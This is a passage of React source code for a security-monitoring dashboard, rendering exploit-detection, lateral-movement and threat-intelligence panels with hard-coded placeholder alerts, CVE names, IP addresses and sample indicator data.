          <div style={{ display: 'grid', gridTemplateColumns: '1.55fr .9fr', gap: 8 }}>
            <MonitorPanel title="Recent High Risk Events">
              <div style={{ display: 'grid', gridTemplateColumns: '100px 110px 170px 110px 78px 1fr', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['Time', 'User', 'Event', 'Source', 'Risk Score', 'Details'].map(h => <span key={h}>{h}</span>)}</div>
              {rows.slice(0, 5).map((a, i) => {
                const score = a.riskScore || fallbackRows[i]?.riskScore || [90, 85, 75, 72, 65][i];
                return <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '100px 110px 170px 110px 78px 1fr', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '9px 14px', fontSize: 10 }}><span>{a.createdAt ? new Date(a.createdAt).toLocaleString([], { day: '2-digit', hour: '2-digit', minute: '2-digit' }) : 'Today, 10:24:15'}</span><b>{a.username || fallbackRows[i]?.username}</b><span>{credentialEvent(a, i)}</span><span>{a.srcip || fallbackRows[i]?.srcip}</span><b style={{ color: '#fff', background: scoreColor(score), borderRadius: 4, textAlign: 'center' }}>{score}</b><span style={{ color: MON.red }}>{a.details || fallbackRows[i]?.details}</span></div>;
              })}
              <div style={{ color: MON.cyan, textAlign: 'center', padding: 10, fontWeight: 900, fontSize: 11 }}>View All Alerts</div>
            </MonitorPanel>
            <MonitorPanel title="Alerts by Category">
              <div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={30} label={String(highAlerts)} color={MON.red} accent={MON.orange} />
                <BarList rows={alertCats.map(([label, value, pctLabel, color]) => ({ label, value, valueLabel: `${value} (${pctLabel})`, color }))} />
              </div>
            </MonitorPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend credential events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function exploitAttackType(alert = {}, index = 0) {
  const text = `${alert.ruleId || ''} ${alert.description || ''}`.toLowerCase();
  if (/rce|remote code/.test(text)) return 'Remote Code Execution (RCE)';
  if (/sql/.test(text)) return 'SQL Injection';
  if (/xss|cross site/.test(text)) return 'Cross Site Scripting (XSS)';
  if (/command/.test(text)) return 'Command Injection';
  if (/traversal/.test(text)) return 'Directory Traversal';
  if (/lfi|rfi|file inclusion/.test(text)) return 'File Inclusion (LFI/RFI)';
  if (/auth/.test(text)) return 'Authentication Bypass';
  if (/deserial/.test(text)) return 'Deserialization Attack';
  return ['Remote Code Execution (RCE)', 'SQL Injection', 'Cross Site Scripting (XSS)', 'Command Injection', 'Directory Traversal', 'File Inclusion (LFI/RFI)', 'Authentication Bypass'][index % 7];
}

// 🛡️ 15. Exploit Detection popup UI
function ExploitDetectionDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['RCE Attempt Detected', 'WEB-SERVER-01', 'critical', '185.220.101.23'],
    ['SQL Injection Attempt', 'WEB-SERVER-01', 'critical', '103.45.67.89'],
    ['Privilege Escalation', 'APP-SERVER-02', 'critical', '81.16.23.11'],
    ['Command Injection', 'APP-SERVER-02', 'high', '185.199.109.153'],
    ['XSS Attempt Detected', 'WEB-SERVER-03', 'high', '45.77.23.55'],
  ].map(([description, agentName, severity, srcip], i) => ({
    _id: `exploit-fallback-${i}`,
    description,
    agentName,
    severity,
    srcip,
    createdAt: new Date(Date.now() - i * 35 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const critical = rows.filter(a => a.severity === 'critical').length * 25 || 128;
  const high = rows.filter(a => a.severity === 'high').length * 104 || 312;
  const medium = rows.filter(a => a.severity === 'medium').length * 168 || 674;
  const low = rows.filter(a => a.severity === 'low').length * 314 || 1256;
  const totalAlerts = total || critical + high + medium + low || 2370;
  const series = [280, 305, 285, 330, 315, 342, 312, 405, 398, 365, 335, 342, 342, 385, 430, 415, 392, 414, 365, 425, 386, 348];
  const categoryRows = [
    ['Web Exploits', 832, '35.1%', MON.red], ['RCE Attempts', 542, '22.9%', MON.orange],
    ['Privilege Escalation', 421, '17.8%', MON.yellow], ['Network Exploits', 313, '13.2%', MON.cyan],
    ['Endpoint Exploits', 154, '6.5%', MON.blue], ['Others', 108, '4.5%', '#2f80ed'],
  ];
  const attackTypes = [
    ['Remote Code Execution (RCE)', 542, MON.red], ['SQL Injection', 421, MON.red], ['Cross Site Scripting (XSS)', 313, MON.orange],
    ['Command Injection', 256, MON.orange], ['Directory Traversal', 198, MON.yellow], ['File Inclusion (LFI/RFI)', 154, MON.yellow],
    ['Authentication Bypass', 128, MON.yellow], ['Deserialization Attack', 102, MON.yellow], ['Others', 256, '#e5e7eb'],
  ];
  const cves = [
    ['CVE-2021-44228', 'Log4j RCE Vulnerability', 198], ['CVE-2022-30190', 'Follina RCE Vulnerability', 156],
    ['CVE-2020-1472', 'ZeroLogon Vulnerability', 128], ['CVE-2017-0144', 'EternalBlue SMB Exploit', 104], ['CVE-2021-26855', 'ProxyLogon Vulnerability', 98],
  ];
  const sourceIps = [
    ['185.220.101.23', 342, 'Netherlands'], ['103.45.67.89', 256, 'United States'], ['81.16.23.11', 198, 'Germany'],
    ['185.199.109.153', 156, 'United States'], ['45.77.23.55', 134, 'Russian Federation'],
  ];
  const sources = [['IDS/IPS', 28, MON.red], ['WAF', 22, MON.orange], ['EDR', 18, MON.yellow], ['SIEM Correlation', 16, MON.blue], ['Firewall', 10, MON.green], ['Others', 6, MON.purple]];
  const assets = [
    ['WEB-SERVER-01', '10.10.10.21', 342], ['APP-SERVER-02', '10.10.10.22', 256], ['DB-SERVER-01', '10.10.10.23', 198],
    ['MAIL-SERVER-01', '10.10.10.24', 156], ['ENDPOINT-125', '10.10.10.125', 134],
  ];
  const kpis = [
    ['!', 'CRITICAL ALERTS', critical, '↑ 35% vs yesterday', MON.red],
    ['⚠', 'HIGH SEVERITY', high, '↑ 28% vs yesterday', MON.orange],
    ['⚠', 'MEDIUM SEVERITY', medium, '↑ 15% vs yesterday', MON.yellow],
    ['i', 'LOW SEVERITY', low.toLocaleString(), '↓ 10% vs yesterday', MON.blue],
    ['▤', 'TOTAL ALERTS', totalAlerts.toLocaleString(), '↑ 18% vs yesterday', MON.purple],
  ];

  return (
    <SocDashboardShell kind="exploit" active="Overview">
      <div style={{ overflow: 'auto', padding: 12, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 10 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(5, 1fr)', gap: 10 }}>
            {kpis.map(([icon, title, value, sub, color]) => (
              <section key={title} style={{ minHeight: 96, border: `1px solid ${MON.border}`, borderRadius: 8, background: `linear-gradient(135deg, ${color}10, rgba(10,25,48,.96) 42%, rgba(6,16,31,.98))`, padding: 15, display: 'grid', gridTemplateColumns: '54px 1fr', gap: 13, alignItems: 'center' }}>
                <span style={{ width: 50, height: 50, borderRadius: 25, display: 'grid', placeItems: 'center', color: '#fff', background: `${color}55`, border: `1px solid ${color}44`, fontSize: 24 }}>{icon}</span>
                <span><b style={{ color, fontSize: 11 }}>{title}</b><strong style={{ display: 'block', fontSize: 27, lineHeight: 1, marginTop: 7, color }}>{value}</strong><small style={{ color, fontWeight: 800 }}>{sub}</small></span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.35fr 1fr .82fr', gap: 10 }}>
            <MonitorPanel title="EXPLOIT ALERTS OVER TIME" right={<span style={{ color: MON.muted }}>⋮</span>}>
              <div style={{ padding: 16, height: 218, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '62px 36px' }}>
                {monitorSpark(series, MON.red, 'rgba(255,49,94,.10)', 44)}
                {monitorSpark(series.map(v => v * .72), MON.orange, 'rgba(255,138,31,.08)', 44)}
                {monitorSpark(series.map(v => v * .43), MON.yellow, 'rgba(255,179,38,.08)', 44)}
                {monitorSpark(series.map(v => v * .18), MON.blue, 'rgba(20,133,255,.08)', 44)}
              </div>
            </MonitorPanel>
            <MonitorPanel title="EXPLOIT ATTACKS BY CATEGORY" right={<span style={{ color: MON.muted }}>⋮</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '145px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={35} label={totalAlerts.toLocaleString()} color={MON.red} accent={MON.orange} />
                <BarList rows={categoryRows.map(([label, value, pctLabel, color]) => ({ label, value, valueLabel: `${value} (${pctLabel})`, color }))} />
              </div>
            </MonitorPanel>
            <MonitorPanel title="TOP ATTACK TYPES" right={<span style={{ color: MON.muted }}>⋮</span>}>
              <div style={{ padding: '6px 14px' }}>
                {attackTypes.map(([label, value, color]) => <div key={label} style={{ display: 'grid', gridTemplateColumns: '1fr 44px', gap: 8, borderBottom: `1px solid ${MON.line}`, padding: '7px 0', fontSize: 11 }}><b>{label}</b><b style={{ color, textAlign: 'right' }}>{value}</b></div>)}
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.88fr .95fr 1.18fr', gap: 10 }}>
            <MonitorPanel title="TOP EXPLOITED CVES">
              <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr 54px 70px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['CVE ID', 'DESCRIPTION', 'COUNT', 'SEVERITY'].map(h => <span key={h}>{h}</span>)}</div>
              {cves.map(([id, desc, count]) => <div key={id} style={{ display: 'grid', gridTemplateColumns: '120px 1fr 54px 70px', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '9px 14px', fontSize: 10 }}><b>{id}</b><span>{desc}</span><span>{count}</span><b style={{ color: MON.red }}>● Critical</b></div>)}
              <div style={{ color: MON.cyan, textAlign: 'center', padding: 10, fontSize: 10, fontWeight: 900 }}>View All</div>
            </MonitorPanel>
            <MonitorPanel title="EXPLOIT ATTEMPTS BY SOURCE IP (TOP 10)" right={<span style={{ color: MON.muted }}>⋮</span>}>
              <div style={{ display: 'grid', gridTemplateColumns: '24px 1fr 54px 120px 70px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['', 'SOURCE IP', 'COUNT', 'COUNTRY', 'TREND'].map(h => <span key={h}>{h}</span>)}</div>
              {sourceIps.map(([ip, count, country], i) => <div key={ip} style={{ display: 'grid', gridTemplateColumns: '24px 1fr 54px 120px 70px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '8px 14px', fontSize: 10 }}><span>{i + 1}</span><b>{ip}</b><span>{count}</span><span>{country}</span>{monitorSpark([1, 3, 2, 6, 3, 5, 2].map(v => v + i), MON.red, 'transparent', 20)}</div>)}
              <div style={{ color: MON.cyan, textAlign: 'center', padding: 8, fontSize: 10, fontWeight: 900 }}>View All</div>
            </MonitorPanel>
            <MonitorPanel title="EXPLOIT ATTEMPTS BY DESTINATION" right={<span style={{ color: MON.muted }}>⋮</span>}>
              <div style={{ position: 'relative', minHeight: 220 }}>
                <ThreatMap auth />
                <div style={{ position: 'absolute', left: 18, bottom: 20, fontSize: 10, display: 'grid', gap: 7 }}>
                  <b style={{ color: MON.red }}>● High (&gt; 500)</b><b style={{ color: MON.orange }}>● Medium (100 - 500)</b><b style={{ color: MON.yellow }}>● Low (&lt; 100)</b>
                </div>
                <div style={{ position: 'absolute', right: 16, bottom: 20, display: 'grid', gap: 6 }}><button style={{ background: '#0b1d35', color: MON.text, border: `1px solid ${MON.border}`, borderRadius: 4 }}>+</button><button style={{ background: '#0b1d35', color: MON.text, border: `1px solid ${MON.border}`, borderRadius: 4 }}>−</button></div>
              </div>
            </MonitorPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.92fr .95fr 1.25fr', gap: 10 }}>
            <MonitorPanel title="DETECTION SOURCES" right={<span style={{ color: MON.muted }}>⋮</span>}>
              <BarList rows={sources.map(([label, value, color]) => ({ label, value, valueLabel: `${value}%`, color }))} />
            </MonitorPanel>
            <MonitorPanel title="EXPLOIT ALERTS BY ASSET">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 100px 58px 70px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['ASSET NAME', 'ASSET IP', 'ALERTS', 'TREND'].map(h => <span key={h}>{h}</span>)}</div>
              {assets.map(([name, ip, count], i) => <div key={name} style={{ display: 'grid', gridTemplateColumns: '1fr 100px 58px 70px', gap: 8, alignItems: 'center', borderTop: `1px solid ${MON.line}`, padding: '9px 14px', fontSize: 10 }}><b>{name}</b><span>{ip}</span><span>{count}</span>{monitorSpark([1, 4, 2, 6, 3, 7, 4].map(v => v + i), MON.red, 'transparent', 20)}</div>)}
              <div style={{ color: MON.cyan, textAlign: 'center', padding: 8, fontSize: 10, fontWeight: 900 }}>View All</div>
            </MonitorPanel>
            <MonitorPanel title="RECENT EXPLOIT ALERTS">
              <div style={{ display: 'grid', gridTemplateColumns: '90px 1fr 120px 74px 105px', gap: 8, color: MON.muted, fontSize: 9, fontWeight: 900, padding: '10px 14px' }}>{['TIME', 'ALERT', 'ASSET', 'SEVERITY', 'SOURCE IP'].map(h => <span key={h}>{h}</span>)}</div>
              {rows.slice(0, 5).map((a, i) => {
                const sev = a.severity || fallbackRows[i]?.severity || 'high';
                const color = sev === 'critical' ? MON.red : MON.orange;
                return <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '90px 1fr 120px 74px 105px', gap: 8, borderTop: `1px solid ${MON.line}`, padding: '9px 14px', fontSize: 10 }}><span>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }) : '10:24:10 AM'}</span><b>{a.description || fallbackRows[i]?.description}</b><span>{a.agentName || fallbackRows[i]?.agentName}</span><b style={{ color }}>● {sev}</b><span>{a.srcip || fallbackRows[i]?.srcip}</span></div>;
              })}
              <div style={{ color: MON.cyan, textAlign: 'center', padding: 8, fontSize: 10, fontWeight: 900 }}>View All Alerts</div>
            </MonitorPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend exploit events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function LateralMovementDetectionDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const sorted = [...alerts].sort((a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0));
  const fallbackRows = [
    ['Possible Pass-the-Hash Attack Detected', '10.0.1.25', '10.0.2.20', 'critical'],
    ['Multiple Failed Logins Followed by Success', '10.0.2.15', '10.0.1.50', 'critical'],
    ['Suspicious PowerShell Execution', '10.0.1.10', '10.0.3.25', 'critical'],
    ['Abnormal SMB Access to ADMINS Share', '10.0.3.18', '10.0.2.60', 'high'],
    ['Possible Kerberos Ticket Manipulation', '10.0.2.30', '10.0.1.80', 'high'],
  ].map(([description, srcip, destip, severity], i) => ({
    _id: `lateral-fallback-${i}`,
    description,
    srcip,
    destip,
    severity,
    createdAt: new Date(Date.now() - i * 2 * 60 * 1000).toISOString(),
  }));
  const rows = sorted.length ? sorted : fallbackRows;
  const totalAlerts = total || 1248;
  const critical = rows.filter(a => a.severity === 'critical').length * 8 || 23;
  const high = rows.filter(a => a.severity === 'high').length * 39 || 156;
  const medium = rows.filter(a => a.severity === 'medium').length * 86 || 342;
  const low = rows.filter(a => a.severity === 'low').length * 181 || 727;
  const assets = new Set(rows.flatMap(a => [a.agentName, a.srcip, a.destip, a.systemId?.name]).filter(Boolean)).size || 1524;
  const score = Math.max(52, 82 - Math.min(18, critical));
  const timeline = [70, 125, 92, 156, 105, 118, 151, 138, 215, 325, 235, 268, 178, 221, 312, 256, 289, 318];
  const movementRows = [
    ['RDP Sessions', 18, '+5', MON.red],
    ['SMB Connections', 34, '+8', MON.orange],
    ['WMI Execution', 12, '+2', MON.yellow],
    ['PsExec Activities', 7, '+3', MON.red],
    ['PowerShell Remoting', 15, '+4', MON.orange],
  ];
  const sources = [['10.0.1.25', 126], ['10.0.2.15', 98], ['10.0.1.10', 76], ['10.0.3.18', 64], ['10.0.2.30', 55]];
  const destinations = [['10.0.2.20', 112], ['10.0.1.50', 92], ['10.0.3.25', 68], ['10.0.2.60', 58], ['10.0.1.80', 47]];
  const categoryRows = [['Lateral Movement', 320, MON.red], ['Initial Access', 256, MON.orange], ['Credential Access', 210, MON.yellow], ['Defense Evasion', 180, MON.blue], ['Execution', 145, MON.green]];
  const sourcesStatus = [['Firewall', MON.blue], ['IDS/IPS', MON.cyan], ['EDR', MON.blue], ['SIEM', MON.cyan], ['AD', '#94a3b8'], ['VPN', '#94a3b8'], ['Cloud', '#94a3b8'], ['Email Security', '#94a3b8']];
  const kpis = [
    ['▾', 'OVERALL SECURITY SCORE', `${score}`, '/100', MON.green, `Good`],
    ['♟', 'TOTAL ALERTS', totalAlerts.toLocaleString(), '+12.5%', MON.red],
    ['!', 'CRITICAL ALERTS', critical, '+4', MON.red],
    ['⚠', 'HIGH ALERTS', high, '+8', MON.orange],
    ['!', 'MEDIUM ALERTS', medium, '+10', MON.yellow],
    ['i', 'LOW ALERTS', low, '-5', MON.blue],
    ['▤', 'ASSETS MONITORED', assets.toLocaleString(), 'Online', '#94a3b8'],
  ];
  const LPanel = ({ title, children, right }) => (
    <section style={{ border: `1px solid ${MON.border}`, borderRadius: 7, background: 'linear-gradient(180deg,rgba(9,24,43,.98),rgba(5,15,29,.98))', overflow: 'hidden' }}>
      <div style={{ minHeight: 28, display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '7px 11px', borderBottom: `1px solid ${MON.line}`, color: '#dbeafe', fontSize: 10, fontWeight: 950, textTransform: 'uppercase' }}>
        <span>{title}</span>{right || null}
      </div>
      {children}
    </section>
  );

  return (
    <SocDashboardShell kind="lateralmovement" active="Dashboard">
      <div style={{ overflow: 'auto', padding: 8, background: MON.bg, color: MON.text }}>
        <div style={{ minWidth: 1120, display: 'grid', gap: 8 }}>
          <div style={{ display: 'grid', gridTemplateColumns: '1.15fr repeat(6, 1fr)', gap: 8 }}>
            {kpis.map(([icon, title, value, sub, color, note]) => (
              <section key={title} style={{ minHeight: 70, border: `1px solid ${MON.border}`, borderRadius: 7, background: 'linear-gradient(135deg,rgba(11,29,51,.98),rgba(6,17,32,.98))', padding: 12, display: 'grid', gridTemplateColumns: '38px 1fr', gap: 10, alignItems: 'center' }}>
                <span style={{ width: 34, height: 34, borderRadius: icon === '▤' ? 5 : 17, display: 'grid', placeItems: 'center', color: '#fff', background: `${color}38`, border: `1px solid ${color}44`, fontSize: 18, fontWeight: 950 }}>{icon}</span>
                <span style={{ minWidth: 0 }}><b style={{ display: 'block', color: '#cbd5e1', fontSize: 8, fontWeight: 950 }}>{title}</b><strong style={{ color, fontSize: 24, lineHeight: 1.05 }}>{value}</strong><small style={{ color: note ? MON.green : color, fontSize: 9, fontWeight: 850 }}> {sub} {note || ''}</small></span>
              </section>
            ))}
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.22fr 1fr 1fr 1.25fr', gap: 8 }}>
            <LPanel title="Alerts Over Time" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours ▾</span>}>
              <div style={{ height: 160, padding: 12, backgroundImage: 'linear-gradient(rgba(255,255,255,.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,.05) 1px, transparent 1px)', backgroundSize: '42px 30px' }}>{monitorSpark(timeline, MON.red, 'rgba(255,49,94,.18)', 120)}</div>
            </LPanel>
            <LPanel title="Alerts by Severity">
              <div style={{ display: 'grid', gridTemplateColumns: '132px 1fr', alignItems: 'center', padding: 14 }}>
                <Donut value={58} label={totalAlerts.toLocaleString()} color={MON.blue} accent={MON.orange} />
                <BarList rows={[
                  { label: 'Critical', value: critical, valueLabel: `${critical} (1.8%)`, color: MON.red },
                  { label: 'High', value: high, valueLabel: `${high} (12.5%)`, color: MON.orange },
                  { label: 'Medium', value: medium, valueLabel: `${medium} (27.4%)`, color: MON.yellow },
                  { label: 'Low', value: low, valueLabel: `${low} (58.3%)`, color: MON.blue },
                ]} />
              </div>
            </LPanel>
            <LPanel title="Top Alert Categories" right={<span style={{ color: MON.muted, fontSize: 9 }}>Last 24 Hours ▾</span>}>
              <BarList rows={categoryRows.map(([label, value, color]) => ({ label, value, color }))} />
            </LPanel>
            <LPanel title="Live Attack Map" right={<span style={{ color: MON.muted }}>...</span>}>
              <div style={{ position: 'relative' }}><ThreatMap auth /><div style={{ position: 'absolute', left: 12, bottom: 10, fontSize: 9, display: 'grid', gap: 3 }}><b style={{ color: MON.red }}>● High</b><b style={{ color: MON.orange }}>● Medium</b><b style={{ color: MON.green }}>● Low</b></div></div>
            </LPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.9fr 1fr 1fr 1.15fr', gap: 8 }}>
            <LPanel title="Lateral Movement Detection">
              <div style={{ padding: 11, display: 'grid', gap: 9 }}>{movementRows.map(([label, value, delta, color]) => <div key={label} style={{ display: 'grid', gridTemplateColumns: '18px 1fr 34px 34px', gap: 7, alignItems: 'center', fontSize: 10 }}><span style={{ color: MON.muted }}>▣</span><b>{label}</b><span>{value}</span><b style={{ color }}>{delta}</b></div>)}<div style={{ color: MON.cyan, textAlign: 'center', fontSize: 10, fontWeight: 900 }}>View All</div></div>
            </LPanel>
            <LPanel title="Top Sources (Internal)">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 50px 72px', gap: 8, padding: '8px 12px', color: MON.muted, fontSize: 9, fontWeight: 900 }}>{['IP Address', 'Alerts', 'Trend'].map(h => <span key={h}>{h}</span>)}</div>
              {sources.map(([ip, count], i) => <div key={ip} style={{ display: 'grid', gridTemplateColumns: '1fr 50px 72px', gap: 8, padding: '7px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10 }}><b>{ip}</b><span>{count}</span>{monitorSpark([2, 5, 3, 6, 4, 7, 3].map(v => v + i), i < 2 ? MON.red : MON.orange, 'transparent', 18)}</div>)}
            </LPanel>
            <LPanel title="Top Destinations (Internal)">
              <div style={{ display: 'grid', gridTemplateColumns: '1fr 50px 72px', gap: 8, padding: '8px 12px', color: MON.muted, fontSize: 9, fontWeight: 900 }}>{['IP Address', 'Alerts', 'Trend'].map(h => <span key={h}>{h}</span>)}</div>
              {destinations.map(([ip, count], i) => <div key={ip} style={{ display: 'grid', gridTemplateColumns: '1fr 50px 72px', gap: 8, padding: '7px 12px', borderTop: `1px solid ${MON.line}`, fontSize: 10 }}><b>{ip}</b><span>{count}</span>{monitorSpark([3, 4, 2, 6, 3, 8, 4].map(v => v + i), i < 2 ? MON.red : MON.orange, 'transparent', 18)}</div>)}
            </LPanel>
            <LPanel title="Recent Critical Alerts">
              {rows.slice(0, 5).map((a, i) => <div key={a._id || i} style={{ display: 'grid', gridTemplateColumns: '1fr 42px', gap: 8, padding: '8px 11px', borderTop: i ? `1px solid ${MON.line}` : 0, fontSize: 10 }}><span><b style={{ display: 'block', color: '#dbeafe' }}>{a.description || fallbackRows[i]?.description}</b><small style={{ color: MON.muted }}>{a.srcip || fallbackRows[i]?.srcip}</small></span><span style={{ color: MON.muted }}>{a.createdAt ? new Date(a.createdAt).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : '15:28'}</span></div>)}
              <div style={{ color: MON.cyan, textAlign: 'center', padding: 8, fontSize: 10, fontWeight: 900 }}>View All Alerts</div>
            </LPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '.92fr .92fr .92fr 1fr', gap: 8 }}>
            <LPanel title="Authentication Events"><div style={{ display: 'grid', gridTemplateColumns: '122px 1fr', alignItems: 'center', padding: 12 }}><Donut value={65} label="2,856" color={MON.green} accent={MON.red} /><BarList rows={[{ label: 'Successful', value: 1856, valueLabel: '1,856 (65%)', color: MON.green }, { label: 'Failed', value: 820, valueLabel: '820 (29%)', color: MON.red }, { label: 'Other', value: 180, valueLabel: '180 (6%)', color: MON.muted }]} /></div></LPanel>
            <LPanel title="Endpoint Risk Status"><div style={{ display: 'grid', gridTemplateColumns: '122px 1fr', alignItems: 'center', padding: 12 }}><Donut value={69} label={assets.toLocaleString()} color={MON.green} accent={MON.red} /><BarList rows={[{ label: 'High Risk', value: 120, valueLabel: '120 (7.9%)', color: MON.red }, { label: 'Medium Risk', value: 350, valueLabel: '350 (23%)', color: MON.orange }, { label: 'Low Risk', value: 1054, valueLabel: '1,054 (69.1%)', color: MON.green }]} /></div></LPanel>
            <LPanel title="Threat Intelligence Feed"><div style={{ padding: 10, display: 'grid', gap: 8 }}>{[['Malicious IP 185.220.101.45', 'High'], ['New Ransomware Campaign Detected', 'High'], ['CVE-2024-3094 Exploitation Detected', 'Medium'], ['Suspicious Domain update-service[.]top', 'Medium'], ['Malware Hash 3f8a2e... Detected', 'Low']].map(([text, sev]) => <div key={text} style={{ display: 'grid', gridTemplateColumns: '1fr 54px', gap: 8, fontSize: 10 }}><span>{text}</span><b style={{ color: sev === 'High' ? MON.red : sev === 'Medium' ? MON.yellow : MON.green, textAlign: 'right' }}>{sev}</b></div>)}</div></LPanel>
            <LPanel title="Lateral Movement Risk Score"><div style={{ padding: 12, display: 'grid', placeItems: 'center' }}><Donut value={74} label="74/100" color={MON.yellow} accent={MON.red} /><b style={{ color: MON.red, fontSize: 11, marginTop: 6 }}>High Risk</b><span style={{ color: MON.cyan, fontSize: 10, marginTop: 8 }}>View Details</span></div></LPanel>
          </div>

          <div style={{ display: 'grid', gridTemplateColumns: '1.8fr .7fr', gap: 8 }}>
            <LPanel title="Sensor / Log Sources Status"><div style={{ display: 'grid', gridTemplateColumns: 'repeat(8, 1fr)', gap: 8, padding: 14 }}>{sourcesStatus.map(([label, color]) => <div key={label} style={{ display: 'grid', gridTemplateColumns: '24px 1fr', gap: 6, alignItems: 'center', fontSize: 9 }}><span style={{ color, fontSize: 18 }}>▦</span><span><b style={{ display: 'block' }}>{label}</b><small style={{ color: MON.green }}>● Active</small></span></div>)}</div></LPanel>
            <LPanel title="System Status"><div style={{ padding: 14, display: 'grid', gap: 8 }}>{[['System Health', 98], ['Log Ingestion', 95], ['Alert Processing', 97]].map(([label, pct]) => <div key={label} style={{ display: 'grid', gridTemplateColumns: '90px 1fr 34px', gap: 8, alignItems: 'center', fontSize: 10 }}><span>{label}</span><span style={{ height: 7, background: MON.line, borderRadius: 9, overflow: 'hidden' }}><i style={{ display: 'block', width: `${pct}%`, height: '100%', background: MON.green }} /></span><b>{pct}%</b></div>)}</div></LPanel>
          </div>
          {loading && <div style={{ color: MON.muted, fontSize: 11, textAlign: 'right' }}>Loading backend lateral movement events...</div>}
        </div>
      </div>
    </SocDashboardShell>
  );
}

function ThreatIntelligenceMonitoringDashboardPanel({ alerts = [], loading = false, total = 0 }) {
  const totalMatches = total || alerts.length || 342;
  const maliciousIps = alerts.filter(a => /ip|src|ioc/i.test(`${a.ruleId || ''} ${a.description || ''}`)).length * 31 || 127;
  const maliciousDomains = alerts.filter(a => /domain|dns/i.test(`${a.ruleId || ''} ${a.description || ''}`)).length * 22 || 89;
  const maliciousUrls = alerts.filter(a => /url|http/i.test(`${a.ruleId || ''} ${a.description || ''}`)).length * 39 || 156;
  const hashes = alerts.filter(a => a.fileHash || /hash|malware/i.test(`${a.ruleId || ''} ${a.description || ''}`)).length * 16 || 64;
  const high = alerts.filter(a => a.severity === 'critical' || a.severity === 'high').length * 13 || 78;
  const timeline = [82, 96, 77, 110, 101, 122, 128, 136, 148, 176, 184, 162, 151, 169, 159, 124, 131, 118];
  const kpis = [
    ['⌖', 'IOC MATCHES', totalMatches, '↑ 18% vs last 24h', MON.orange],
    ['◎', 'MALICIOUS IPS', maliciousIps, '↑ 15% vs last 24h', MON.cyan],
    ['www', 'MALICIOUS DOMAINS', maliciousDomains, '↑ 10% vs last 24h', MON.orange],
    ['🔗', 'MALICIOUS URLS', maliciousUrls, '↑ 20% vs last 24h', MON.purple],
    ['☣', 'MALWARE HASHES', hashes, '↑ 12% vs last 24h', MON.yellow],
    ['▱', 'THREAT FEEDS', 12, 'Active Feeds', MON.green],
    ['!', 'HIGH SEVERITY ALERTS', high, '↑ 25% vs last 24h', MON.red],
  ];
  const ipRows = [['185.220.101.12', 45, 'High'], ['103.152.118.55', 32, 'High'], ['45.77.32.11', 28, 'Medium'], ['89.248.165.10', 24, 'Medium'], ['152.89.78.45', 18, 'Low']];
  const domainRows = [['malicious-domain.com', 36, 'High', 'C2 Server'], ['phishing-login.net', 29, 'High', 'Phishing'], ['badware-hosting.org', 21, 'Medium', 'Malware'], ['update-fake.com', 18, 'Medium', 'Suspicious'], ['secure-verify.info', 15, 'Low', 'Phishing']];
  const hashRows = [['a3b5c6d7e8f91234567890abcdef...', 22, 'High', 'Ransomware'], ['b1c4f567a8bc91234567890abcdef...', 18, 'High', 'Trojan'], ['e5f6a7b8c9d01234567890abcdef...', 15, 'Medium', 'Backdoor'], ['f6a7b8c9d0e11234567890abcdef...', 12, 'Medium', 'Spyware'], ['a7b8c9d0e1f21234567890abcdef...', 9, 'Low', 'Worm']];
  const feeds = [['AlienVault OTX', 'Active', '1,245,679'], ['ThreatFox', 'Active', '856,421'], ['VirusTotal', 'Active', '2,345,987'], ['URLHaus', 'Active', '456,231'], ['AbuseIPDB', 'Active', '789,654']];
  const countryRows = [
    ['United States', 312, 'High', MON.red],
    ['Russia', 241, 'High', MON.red],
    ['China', 198, 'Medium', MON.orange],
    ['Netherlands', 121, 'Medium', MON.yellow],
    ['Germany', 89, 'Low', MON.green],
  ];
  const Panel = ({ title, children, right }) => (
